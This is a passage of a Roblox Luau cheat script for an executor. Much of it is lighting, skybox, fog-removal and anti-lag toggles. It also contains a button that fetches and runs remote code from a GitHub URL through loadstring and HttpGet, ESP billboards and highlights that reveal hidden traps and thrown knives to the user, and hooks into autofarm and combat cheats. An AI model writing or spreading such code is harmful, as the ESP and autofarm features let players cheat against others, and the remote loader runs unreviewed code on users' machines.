            Lighting.FogEnd = 100000
            Lighting.FogStart = 0
            Lighting.GlobalShadows = true
            Lighting.GeographicLatitude = 41.733001708984375
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
            Lighting.ShadowSoftness = 0.20000000298023224
            Lighting.ColorShift_Top = Color3.new(0, 0, 0)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.Technology = Enum.Technology.Future
            Lighting.TimeOfDay = "03:00:00"

            local Sky = Instance.new("Sky")
            Sky.Name = "Sky"
            Sky.CelestialBodiesShown = true
            Sky.SkyboxBk = "rbxasset://textures/sky/sky512_bk.tex"
            Sky.SkyboxDn = "rbxasset://textures/sky/sky512_dn.tex"
            Sky.SkyboxFt = "rbxasset://textures/sky/sky512_ft.tex"
            Sky.SkyboxLf = "rbxasset://textures/sky/sky512_lf.tex"
            Sky.SkyboxRt = "rbxasset://textures/sky/sky512_rt.tex"
            Sky.SkyboxUp = "rbxasset://textures/sky/sky512_up.tex"
            Sky.MoonAngularSize = 11
            Sky.SunAngularSize = 21
            Sky.MoonTextureId = "rbxasset://sky/moon.jpg"
            Sky.SunTextureId = "rbxasset://sky/sun.jpg"
            Sky.StarCount = 5000
            Sky.Parent = Lighting

            local Blur = Instance.new("BlurEffect")
            Blur.Name = "Blur"
            Blur.Enabled = true
            Blur.Size = 0
            Blur.Parent = Lighting

            local Atmosphere = Instance.new("Atmosphere")
            Atmosphere.Name = "Atmosphere"
            Atmosphere.Color = Color3.new(0, 0, 0)
            Atmosphere.Density = 0.5600000023841858
            Atmosphere.Offset = 0
            Atmosphere.Glare = 0
            Atmosphere.Haze = 0
            Atmosphere.Parent = Lighting
        end
    }
)

Tabs.Extension:AddSection("CustomSky")

local Lighting = game:GetService("Lighting")
local customSky = Lighting:FindFirstChild("CustomSkybox") or Instance.new("Sky")
customSky.Name = "CustomSkybox"

local skyData = {
    ["Default"] = "",
        ["BloodMoon"] = "rbxassetid://133864307965574",
        ["Moon"] = "rbxassetid://9013498676",
        ["Retro"] = "rbxassetid://6778075657",
        ["Anime"] = "rbxassetid://10341849875",
        ["Akashi"] = "rbxassetid://13827251876",
        ["Dragon"] = "rbxassetid://6256634884"
    }
    
local sortedNames = {}
for name in pairs(skyData) do
    table.insert(sortedNames, name)
end
table.sort(sortedNames)

Tabs.Extension:AddDropdown("SkyboxChanger", {
    Title = "Skybox Selection",
    Values = sortedNames,
    Default = "Default",
    Callback = function(Value)
        local id = skyData[Value]
        if Value == "Default" or id == "" or id == "rbxassetid://" then
            customSky.Parent = nil
        else
            if id and id ~= "" then
                customSky.SkyboxBk = id
                customSky.SkyboxDn = id
                customSky.SkyboxFt = id
                customSky.SkyboxLf = id
                customSky.SkyboxRt = id
                customSky.SkyboxUp = id
                customSky.Parent = Lighting
            end
        end
    end
})

local RunService = game:GetService("RunService")
local rainbowConnection = nil
local hue = 0

Tabs.Extension:AddToggle("RainbowAmbient", {
    Title = "Rainbow Ambient",
    Description = "",
    Default = false,
    Callback = function(Value)
        if Value then
            rainbowConnection = RunService.RenderStepped:Connect(function(delta)
                hue = (hue + (Options.RainbowSpeed.Value / 100) * delta) % 1
                local color = Color3.fromHSV(hue, 0.8, 1) -- 0.8 это насыщенность
                
                Lighting.Ambient = color
                Lighting.OutdoorAmbient = color
            end)
        else
            if rainbowConnection then
                rainbowConnection:Disconnect()
                rainbowConnection = nil
            end
            Lighting.Ambient = Color3.fromRGB(127, 127, 127)
            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        end
    end
})

Tabs.Extension:AddSlider("RainbowSpeed", {
    Title = "Rainbow Speed",
    Description = "",
    Default = 10,
    Min = 1,
    Max = 50,
    Rounding = 1,
    Callback = function() end
})

Tabs.Extension:AddSection("Lightning Extension")

local normalLighting = {
    Ambient = Lighting.Ambient,
    ColorShift_Bottom = Lighting.ColorShift_Bottom,
    ColorShift_Top = Lighting.ColorShift_Top,
    FogEnd = Lighting.FogEnd,
    FogStart = Lighting.FogStart,
    GlobalShadows = Lighting.GlobalShadows,
    ClockTime = Lighting.ClockTime,
    Brightness = Lighting.Brightness
}

local function applyFullBright()
    Lighting.Ambient = Color3.new(1, 1, 1)
    Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
    Lighting.ColorShift_Top = Color3.new(1, 1, 1)
    Lighting.FogEnd = 100000
    Lighting.FogStart = 0
    Lighting.GlobalShadows = false
    Lighting.ClockTime = 14
    Lighting.Brightness = 2
end

local function restoreLighting()
    for prop, value in pairs(normalLighting) do
        Lighting[prop] = value
    end
end

local Fullbrighting = false

local Toggle = Tabs.Extension:AddToggle("FullBright", {Title = "Full Bright", Default = false})

Toggle:OnChanged(
    function(state)
        Fullbrighting = state
        if Fullbrighting then
            applyFullBright()
        else
            restoreLighting()
        end
    end
)

Options.FullBright:SetValue(false)

Tabs.Extension:AddToggle("OnlyLight", {
    Title = "Disable All Lights",
    Default = false,
    Callback = function(v)
        for _, o in ipairs(workspace:GetDescendants()) do
            if o:IsA("Light") then o.Enabled = not v end
        end
    end
})

local OriginalFogEnd, OriginalDensity, OriginalGlare, OriginalHaze
local FogLoop

local NoFogToggle = Tabs.Extension:AddToggle("NoFogToggle", {
    Title = "Disable Fog",
    Default = false
})

NoFogToggle:OnChanged(function(Value)
    if FogLoop then FogLoop:Disconnect() end
    
    if Value then
        OriginalFogEnd = Lighting.FogEnd
        local Atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
        if Atmosphere then
            OriginalDensity = Atmosphere.Density
            OriginalGlare = Atmosphere.Glare
            OriginalHaze = Atmosphere.Haze
        end

        FogLoop = RunService.RenderStepped:Connect(function()
            Lighting.FogEnd = 100000
            local A = Lighting:FindFirstChildOfClass("Atmosphere")
            if A then
                A.Density = 0
                A.Glare = 0
                A.Haze = 0
            end
        end)
    else
        if FogLoop then FogLoop:Disconnect() end
        
        Lighting.FogEnd = OriginalFogEnd or 1000
        local A = Lighting:FindFirstChildOfClass("Atmosphere")
        if A and OriginalDensity then
            A.Density = OriginalDensity
            A.Glare = OriginalGlare
            A.Haze = OriginalHaze
        end
    end
end)

Tabs.Extension:AddSection("Fast Flag Extension")
if setfflag then
    Tabs.Extension:AddButton({
        Title = "Blox Strap Script",
        Description = "",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/qwertyui-is-back/Bloxstrap/main/Initiate.lua'))()
        end
    })
end

Tabs.Extension:AddSection("Anti Lags Extension")
local Lag1 = false
local Toggle = Tabs.Extension:AddToggle("Anti_Lag1", {Title = "Anti Lag 1", Default = false})
Toggle:OnChanged(function(Value1)
    Lag1 = Value1
    if Lag1 then
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
                v.Material = Enum.Material.SmoothPlastic
                if v:IsA("Texture") then
                    v:Destroy()
                end
            end
        end
    end
end)


Options.Anti_Lag1:SetValue(false)

local Toggle = Tabs.Extension:AddToggle("Anti_Lag2", {Title = "Anti Lag 2", Default = false})

Toggle:OnChanged(
    function(Value3)
        if Value3 then
            local decalsyeeted = true 
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            l.GlobalShadows = false
            l.FogEnd = 9e9
            l.Brightness = 0
            settings().Rendering.QualityLevel = "Level01"
            wait(1)
            for i, v in pairs(g:GetDescendants()) do
                if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                elseif v:IsA("Decal") and decalsyeeted then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                end
            end
        end
    end
)

Options.Anti_Lag2:SetValue(false)

local Toggle = Tabs.Extension:AddToggle("Anti_Lag3", {Title = "Anti Lag 3", Default = false})

Toggle:OnChanged(
    function(Value4)
        if Value4 then
            local decalsyeeted = true
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            sethiddenproperty(l, "Technology", 2)
            sethiddenproperty(t, "Decoration", false)
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            l.GlobalShadows = 0
            l.FogEnd = 9e9
            l.Brightness = 0
            settings().Rendering.QualityLevel = "Level01"
            for i, v in pairs(w:GetDescendants()) do
                if v:IsA("BasePart") and not v:IsA("MeshPart") then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Lifetime = NumberRange.new(0)
                elseif v:IsA("Explosion") then
                    v.BlastPressure = 1
                    v.BlastRadius = 1
                elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                    v.Enabled = false
                elseif v:IsA("MeshPart") and decalsyeeted then
                    v.Material = "Plastic"
                    v.Reflectance = 0
                    v.TextureID = 10385902758728957
                elseif v:IsA("SpecialMesh") and decalsyeeted then
                    v.TextureId = 0
                elseif v:IsA("ShirtGraphic") and decalsyeeted then
                    v.Graphic = 0
                elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
                    v[v.ClassName .. "Template"] = 0
                end
            end
            for i = 1, #l:GetChildren() do
                e = l:GetChildren()[i]
                if
                    e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or
                        e:IsA("BloomEffect") or
                        e:IsA("DepthOfFieldEffect")
                 then
                    e.Enabled = false
                end
            end
            w.DescendantAdded:Connect(
                function(v)
                    wait(1)
                    if v:IsA("BasePart") and not v:IsA("MeshPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                        v.Transparency = 1
                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                        v.Lifetime = NumberRange.new(0)
                    elseif v:IsA("Explosion") then
                        v.BlastPressure = 1
                        v.BlastRadius = 1
                    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                        v.Enabled = false
                    elseif v:IsA("MeshPart") and decalsyeeted then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                        v.TextureID = 10385902758728957
                    elseif v:IsA("SpecialMesh") and decalsyeeted then
                        v.TextureId = 0
                    elseif v:IsA("ShirtGraphic") and decalsyeeted then
                        v.ShirtGraphic = 0
                    elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
                        v[v.ClassName .. "Template"] = 0
                    end
                end
            )
        end
    end
)

Options.Anti_Lag3:SetValue(false)

Tabs.Extension:AddButton({
    Title = "Shit Render",
    Description = "",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        local Terrain = workspace:FindFirstChildOfClass("Terrain")
        local Players = game:GetService("Players")
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e10
        Lighting.Brightness = 1
        if Terrain then
            Terrain.WaterWaveSize = 0
            Terrain.WaterWaveSpeed = 0
            Terrain.WaterReflectance = 0
            Terrain.WaterTransparency = 1
        end
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                obj.Material = Enum.Material.Plastic
                obj.Reflectance = 0
            elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
                obj:Destroy()
            elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
                obj:Destroy()
            end
        end
        for _, player in ipairs(Players:GetPlayers()) do
            local char = player.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("Accessory") or part:IsA("Clothing") then
                        part:Destroy()
                    end
                end
            end
        end
    end
})

Workspace.DescendantAdded:Connect(function(v)
	if DConfiguration.ESP.Objects.ThrowingKnife then
        if v.Name == "KnifeVisual" and v.Parent then
            local part = v.Parent
            CreateBillboardESP("ThrowESP", part, Color3.fromRGB(225, 0, 0), 18)
            UpdateBillboardESP("ThrowESP", part, "Knife Throwing", Color3.fromRGB(225, 0, 0), 18)
        elseif v.Name == "KnifeStickWeld" and v.Parent then
            local part = v.Parent
            CreateBillboardESP("ThrowESP", part, Color3.fromRGB(225, 0, 0), 18)
            UpdateBillboardESP("ThrowESP", part, "Knife Throwing", Color3.fromRGB(225, 0, 0), 18)
        elseif v.Name == "StuckKnife" and v:IsA("BasePart") then
            CreateBillboardESP("ThrowESP", v, Color3.fromRGB(225, 0, 0), 18)
            UpdateBillboardESP("ThrowESP", v, "Knife Throwing", Color3.fromRGB(225, 0, 0), 18)
        end
    end
    
    if DConfiguration.ESP.Objects.Traps then
        if v.Name == "Trap" then
            local part = v:FindFirstChild("TrapVisual") or v:WaitForChild("TrapVisual", 1) or v:FindFirstChild("Trigger") or v:WaitForChild("Trigger", 1)
            
            if part then
	            CreateBillboardESP("TrapESP", part, Color3.fromRGB(225, 0, 0), 18)
	            UpdateBillboardESP("TrapESP", part, "Trap", Color3.fromRGB(225, 0, 0), 18)
	        end 
        end
    end
    
    if DConfiguration.Highlight.Objects.ThrowingKnife then
        if v.Name == "KnifeVisual" and v.Parent then
            CreateHighlightESP("ThrowHighlight", v.Parent, Color3.fromRGB(255,0,0), Color3.fromRGB(255,0,0), DConfiguration.Highlight.OutlineOnly)
        elseif v.Name == "KnifeStickWeld" and v.Parent then
            CreateHighlightESP("ThrowHighlight", v.Parent, Color3.fromRGB(255,0,0), Color3.fromRGB(255,0,0), DConfiguration.Highlight.OutlineOnly)
        elseif v.Name == "StuckKnife" and v:IsA("BasePart") then
            CreateHighlightESP("ThrowHighlight", v, Color3.fromRGB(255,0,0), Color3.fromRGB(255,0,0), DConfiguration.Highlight.OutlineOnly)
        end
    end
    
    if DConfiguration.Highlight.Objects.Traps then
        if v.Name == "Trap" then
            local part = v:FindFirstChild("TrapVisual") or v:WaitForChild("TrapVisual", 1) or v:FindFirstChild("Trigger") or v:WaitForChild("Trigger", 1)
	        CreateHighlightESP("TrapHighlight", v, Color3.fromRGB(255,0,0), Color3.fromRGB(255,0,0), DConfiguration.Highlight.OutlineOnly)
	        
	        if part then
	            part.Transparency = 0
	        end
        end
    end
    
    if v.Name == "CoinContainer" then
        DConfiguration.AutoFarm.FarmingStates.isMax = false
    end
end)

LocalPlayer.CharacterAdded:Connect(function(char)
    DConfiguration.Combat.Innocent.PrankBomb.InCooldown = false
    
    for i, v in pairs(workspace:GetDescendants()) do
       if v.Name == "invischair" then
           v:Destroy()
       end
    end
end) 
